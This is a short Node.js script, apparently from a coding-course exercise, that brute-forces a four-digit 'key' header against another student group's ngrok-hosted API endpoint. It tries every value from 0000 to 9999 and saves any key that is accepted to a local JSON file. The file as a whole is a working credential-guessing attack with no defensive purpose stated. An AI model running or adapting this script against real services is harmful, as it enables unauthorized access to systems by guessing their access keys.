import fs from 'node:fs/promises'
import axios from 'axios'
import keys from '../db/keys.json' assert { type: 'json' }

const DB_PATH_KEY = './db/key.json'

const GROUPS = {
    1: 'https://5e81-2001-b07-a9a-89a8-fc69-90ae-c7c4-8dbc.ngrok-free.app/digitazon/2023/02/group/1/students',
    2: 'https://b6a4-37-162-141-71.ngrok-free.app/digitazon/2023/02/group/2/students',
    3: 'https://4aac-151-33-19-106.ngrok-free.app/digitazon/2023/02/group/3/students',
    4: 'https://f151-93-41-116-144.ngrok-free.app/digitazon/2023/02/group/4/students'
}

async function findKey() {
    for (let i = 0; i < 10000; i++) {
        let currentKey = i.toString().padStart(4, '0')
        let reqInstance = axios.create({
            headers: {
                key: currentKey
            }
        })
        await reqInstance
            .get(`${GROUPS[2]}`)
            .then(
                async () => {
                    console.log(currentKey)
                    keys.push({ 2: currentKey })
                    console.log(keys)
                    await fs.writeFile(DB_PATH_KEY, JSON.stringify(keys, null, '  '))
                }
            ).catch(() => {})
    }
}
findKey()